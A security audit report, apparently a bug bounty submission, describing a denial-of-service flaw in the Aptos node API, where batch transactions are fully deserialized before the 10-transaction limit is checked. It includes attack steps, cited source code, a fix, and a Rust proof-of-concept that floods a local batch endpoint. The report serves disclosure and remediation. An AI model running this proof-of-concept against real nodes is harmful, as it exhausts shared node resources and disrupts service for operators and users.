# Audit Report

## Title
Batch Transaction Deserialization DoS Attack via Out-of-Order Validation

## Summary
The batch transaction submission endpoint performs expensive deserialization and validation operations on all submitted transactions before enforcing the batch size limit, allowing attackers to force the API server to process thousands of transactions even though only 10 are permitted per batch.

## Finding Description

The vulnerability exists in the order of operations when processing batch transaction submissions. The `PostSizeLimitEndpoint::call()` function only validates the Content-Length header against a byte limit (default 8 MB), while the actual batch size limit (default 10 transactions) is enforced much later, after all transactions have already been deserialized and validated. [1](#0-0) 

The Content-Length check passes requests under 8 MB to the inner endpoint without inspecting the number of transactions. When a batch submission reaches `submit_transactions_batch`, the following sequence occurs: [2](#0-1) 

At line 549, `get_signed_transactions_batch()` is called, which performs full BCS deserialization of ALL transactions in the payload: [3](#0-2) 

For BCS-encoded payloads, the entire vector is deserialized at line 1400-1401, and each transaction's payload is validated at lines 1411-1412. Only AFTER this expensive operation completes does the code check if the batch size exceeds the limit at line 550.

An attacker can exploit this by:
1. Crafting a BCS-encoded payload containing ~8,000 small SignedTransactions (each ~1KB) within the 8 MB limit
2. Submitting via POST to `/v1/transactions/batch`
3. The system deserializes all 8,000 transactions and validates each payload
4. Only then does it reject the request for exceeding the 10-transaction limit

The configuration shows these limits are independent: [4](#0-3) 

Additionally, the API runtime configuration shows no rate limiting middleware is applied: [5](#0-4) 

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under the Aptos bug bounty program for the following reasons:

**API Resource Exhaustion**: Repeated exploitation causes CPU and memory exhaustion on the API server through forced deserialization of thousands of transactions per request. BCS deserialization is computationally expensive, and payload validation adds additional CPU overhead.

**Node Performance Degradation**: The API service shares computational resources with critical node functions (consensus, execution, state sync). Sustained API resource exhaustion can degrade overall node performance, affecting block processing times and state synchronization.

**No Funds at Risk**: This does not directly compromise funds, consensus safety, or blockchain state integrity.

**Requires Intervention**: Sustained attacks may require manual intervention to restore API availability, but the node itself remains functional.

This aligns with Medium Severity criteria: "State inconsistencies requiring intervention" and impacts validator node performance without causing critical consensus failures.

## Likelihood Explanation

This vulnerability is **highly likely** to be exploited:

**Low Attack Complexity**: Requires only HTTP POST access to a public API endpoint with a crafted BCS payload containing many small transactions. No authentication, special privileges, or validator access needed.

**No Rate Limiting**: The codebase shows no rate limiting middleware protecting the batch endpoint, allowing sustained attacks.

**Trivial Resource Cost**: Attackers can generate thousands of minimal SignedTransaction structures programmatically with negligible cost.

**Public Attack Surface**: All Aptos full nodes expose the REST API by default on port 8080, making the attack surface widely available.

**Immediate Impact**: Each malicious request immediately consumes server resources before being rejected, enabling rapid resource exhaustion.

## Recommendation

**Immediate Fix**: Reverse the order of validation to check batch size BEFORE deserialization:

For JSON format, check the array length before processing elements. For BCS format, implement a streaming counter that validates the vector length before full deserialization. Modify `submit_transactions_batch`:

```rust
async fn submit_transactions_batch(
    &self,
    accept_type: AcceptType,
    data: SubmitTransactionsBatchPost,
) -> SubmitTransactionsBatchResult<TransactionsBatchSubmissionResult> {
    // VALIDATE COUNT FIRST before expensive operations
    let batch_count = match &data {
        SubmitTransactionsBatchPost::Json(inner) => inner.0.len(),
        SubmitTransactionsBatchPost::Bcs(bcs_data) => {
            // Peek at BCS vector length without full deserialization
            get_bcs_vector_length(&bcs_data.0)?
        }
    };
    
    if batch_count > self.context.max_submit_transaction_batch_size() {
        return Err(SubmitTransactionError::bad_request_with_code(
            format!("Too many transactions: {}, limit is {}", 
                batch_count, self.context.max_submit_transaction_batch_size()),
            AptosErrorCode::InvalidInput,
            &ledger_info,
        ));
    }
    
    // Only deserialize if count check passes
    let signed_transactions_batch = self.get_signed_transactions_batch(&ledger_info, data)?;
    // ... rest of existing code
}
```

**Additional Hardening**:
1. Implement rate limiting middleware for all API endpoints
2. Lower `content_length_limit` specifically for batch endpoints to reduce attack surface
3. Add metrics and alerting for rejected oversized batches
4. Consider per-IP rate limits at the infrastructure layer

## Proof of Concept

```rust
#[tokio::test]
async fn test_batch_deserialization_dos() {
    use aptos_types::transaction::{SignedTransaction, RawTransaction, TransactionPayload};
    use aptos_crypto::{ed25519::Ed25519PrivateKey, PrivateKey, Uniform};
    use bcs;
    
    // Generate 1000 minimal signed transactions
    let mut transactions = Vec::new();
    let private_key = Ed25519PrivateKey::generate_for_testing();
    
    for i in 0..1000 {
        let raw_txn = RawTransaction::new(
            AccountAddress::random(),
            i,
            TransactionPayload::Script(Script::new(vec![0], vec![], vec![])),
            1_000_000,
            0,
            0,
            ChainId::test(),
        );
        let signature = private_key.sign(&raw_txn).unwrap();
        transactions.push(SignedTransaction::new(raw_txn, 
            Ed25519PublicKey::from(&private_key), signature));
    }
    
    // Serialize to BCS
    let bcs_payload = bcs::to_bytes(&transactions).unwrap();
    println!("Payload size: {} bytes for {} transactions", 
        bcs_payload.len(), transactions.len());
    
    // Verify payload is under 8 MB but has 1000 transactions
    assert!(bcs_payload.len() < 8 * 1024 * 1024);
    assert_eq!(transactions.len(), 1000);
    
    // Submit to API - will deserialize all 1000 before rejecting
    // This causes resource exhaustion even though batch limit is 10
    let client = reqwest::Client::new();
    let response = client
        .post("http://localhost:8080/v1/transactions/batch")
        .header("Content-Type", "application/x.aptos.signed_transaction+bcs")
        .body(bcs_payload)
        .send()
        .await
        .unwrap();
    
    // Request is rejected for exceeding batch size, but AFTER full deserialization
    assert_eq!(response.status(), 400);
}
```

## Notes

This vulnerability specifically breaks the **Resource Limits** invariant (#9 from the specification): "All operations must respect gas, storage, and computational limits." The API allows unbounded computational work (deserialization and validation of thousands of transactions) before enforcing the batch size limit, enabling resource exhaustion attacks that do not respect reasonable operational limits.

The fix requires careful implementation for BCS format to avoid re-introducing the problemâ€”the vector length must be extracted without deserializing the entire payload, which may require custom BCS parsing logic or upstream library support.

### Citations

**File:** api/src/check_size.rs (L43-58)
```rust
    async fn call(&self, req: Request) -> Result<Self::Output> {
        if req.method() != Method::POST {
            return self.inner.call(req).await;
        }

        let content_length = req
            .headers()
            .typed_get::<headers::ContentLength>()
            .ok_or(SizedLimitError::MissingContentLength)?;

        if content_length.0 > self.max_size {
            return Err(SizedLimitError::PayloadTooLarge.into());
        }

        self.inner.call(req).await
    }
```

**File:** api/src/transactions.rs (L529-563)
```rust
    async fn submit_transactions_batch(
        &self,
        accept_type: AcceptType,
        data: SubmitTransactionsBatchPost,
    ) -> SubmitTransactionsBatchResult<TransactionsBatchSubmissionResult> {
        data.verify()
            .context("Submitted transactions invalid")
            .map_err(|err| {
                SubmitTransactionError::bad_request_with_code_no_info(
                    err,
                    AptosErrorCode::InvalidInput,
                )
            })?;
        fail_point_poem("endpoint_submit_batch_transactions")?;
        if !self.context.node_config.api.transaction_submission_enabled {
            return Err(api_disabled("Submit batch transaction"));
        }
        self.context
            .check_api_output_enabled("Submit batch transactions", &accept_type)?;
        let ledger_info = self.context.get_latest_ledger_info()?;
        let signed_transactions_batch = self.get_signed_transactions_batch(&ledger_info, data)?;
        if self.context.max_submit_transaction_batch_size() < signed_transactions_batch.len() {
            return Err(SubmitTransactionError::bad_request_with_code(
                format!(
                    "Submitted too many transactions: {}, while limit is {}",
                    signed_transactions_batch.len(),
                    self.context.max_submit_transaction_batch_size(),
                ),
                AptosErrorCode::InvalidInput,
                &ledger_info,
            ));
        }
        self.create_batch(&accept_type, &ledger_info, signed_transactions_batch)
            .await
    }
```

**File:** api/src/transactions.rs (L1393-1414)
```rust
    fn get_signed_transactions_batch(
        &self,
        ledger_info: &LedgerInfo,
        data: SubmitTransactionsBatchPost,
    ) -> Result<Vec<SignedTransaction>, SubmitTransactionError> {
        match data {
            SubmitTransactionsBatchPost::Bcs(data) => {
                let signed_transactions: Vec<SignedTransaction> =
                    bcs::from_bytes_with_limit(&data.0, Self::MAX_SIGNED_TRANSACTION_DEPTH)
                        .context("Failed to deserialize input into SignedTransaction")
                        .map_err(|err| {
                            SubmitTransactionError::bad_request_with_code(
                                err,
                                AptosErrorCode::InvalidInput,
                                ledger_info,
                            )
                        })?;
                // Verify each signed transaction
                for signed_transaction in signed_transactions.iter() {
                    self.validate_signed_transaction_payload(ledger_info, signed_transaction)?;
                }
                Ok(signed_transactions)
```

**File:** config/src/config/api_config.rs (L97-98)
```rust
const DEFAULT_REQUEST_CONTENT_LENGTH_LIMIT: u64 = 8 * 1024 * 1024; // 8 MB
pub const DEFAULT_MAX_SUBMIT_TRANSACTION_BATCH_SIZE: usize = 10;
```

**File:** api/src/runtime.rs (L238-259)
```rust
        let route = Route::new()
            .at("/", poem::get(root_handler))
            .nest(
                "/v1",
                Route::new()
                    .nest("/", api_service)
                    .at("/spec.json", poem::get(spec_json))
                    .at("/spec.yaml", poem::get(spec_yaml))
                    // TODO: We add this manually outside of the OpenAPI spec for now.
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
            )
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```
